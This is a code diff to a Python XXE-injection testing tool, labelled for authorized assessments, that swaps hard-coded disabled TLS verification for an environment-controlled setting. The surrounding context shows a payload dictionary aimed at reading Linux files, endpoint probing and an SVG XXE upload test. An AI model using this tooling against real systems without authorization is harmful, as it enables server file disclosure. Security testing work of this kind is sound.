@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """Agent for testing XXE injection vulnerabilities during authorized assessments."""
 
+import os
 import requests
 import json
 import argparse
@@ -10,6 +11,8 @@ from urllib.parse import urljoin
 import defusedxml.ElementTree as safe_ET
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+VERIFY_TLS = os.environ.get("SKIP_TLS_VERIFY", "").lower() not in ("1", "true", "yes")
 
 XXE_PAYLOADS = {
     "file_read_linux": '''<?xml version="1.0" encoding="UTF-8"?>
@@ -72,7 +75,7 @@ def detect_xml_endpoints(base_url, token=None):
     for ep in endpoints:
         url = urljoin(base_url, ep)
         try:
-            resp = requests.post(url, headers=headers, data=xml_test, timeout=10, verify=False)
+            resp = requests.post(url, headers=headers, data=xml_test, timeout=10, verify=VERIFY_TLS)
             if resp.status_code not in (404, 405, 415):
                 xml_endpoints.append({"endpoint": ep, "status": resp.status_code})
                 print(f"  [+] {ep}: Accepts XML (status {resp.status_code})")
@@ -92,10 +95,10 @@ def test_content_type_switch(base_url, endpoint, token=None):
     url = urljoin(base_url, endpoint)
     try:
         json_resp = requests.post(url, headers=json_headers,
-                                   json={"search": "test"}, timeout=10, verify=False)
+                                   json={"search": "test"}, timeout=10, verify=VERIFY_TLS)
         xml_resp = requests.post(url, headers=xml_headers,
                                   data='<?xml version="1.0"?><root><search>test</search></root>',
-                                  timeout=10, verify=False)
+                                  timeout=10, verify=VERIFY_TLS)
         if xml_resp.status_code not in (415, 400, 404):
             print(f"  [!] Endpoint accepts both JSON ({json_resp.status_code}) and XML ({xml_resp.status_code})")
             return True
@@ -127,7 +130,7 @@ def test_xxe_payloads(base_url, endpoint, token=None, callback=None):
             else:
                 continue
         try:
-            resp = requests.post(url, headers=headers, data=payload, timeout=15, verify=False)
+            resp = requests.post(url, headers=headers, data=payload, timeout=15, verify=VERIFY_TLS)
             indicators = file_indicators.get(name, [])
             matched = [ind for ind in indicators if ind in resp.text]
             if matched:
@@ -169,7 +172,7 @@ def test_svg_upload(base_url, upload_endpoint, token):
     url = urljoin(base_url, upload_endpoint)
     try:
         files = {"file": ("xxe.svg", svg_xxe, "image/svg+xml")}
-        resp = requests.post(url, headers=headers, files=files, timeout=15, verify=False)
+        resp = requests.post(url, headers=headers, files=files, timeout=15, verify=VERIFY_TLS)
         if resp.status_code in (200, 201):
             print(f"  [+] SVG uploaded (status {resp.status_code})")
             return [{"type": "SVG_XXE_UPLOAD", "endpoint": upload_endpoint,
